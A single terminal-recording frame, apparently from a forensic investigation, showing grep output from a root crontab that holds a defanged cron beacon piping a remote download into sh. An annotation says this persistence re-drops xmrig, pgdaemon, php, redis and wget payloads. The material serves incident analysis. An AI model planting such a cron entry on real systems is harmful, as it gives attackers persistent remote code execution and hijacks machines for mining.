[57.706528, "o", "\u001b[35m\u001b[K/disk/var/spool/cron/crontabs/root\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K\u001b[32m\u001b[K5\u001b[m\u001b[K\u001b[36m\u001b[K:\u001b[m\u001b[K# * * * * * root <defanged beacon: curl hxxp://\u001b[01;31m\u001b[K198.51.100\u001b[m\u001b[K.170/x | sh> — cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload\r\n"]
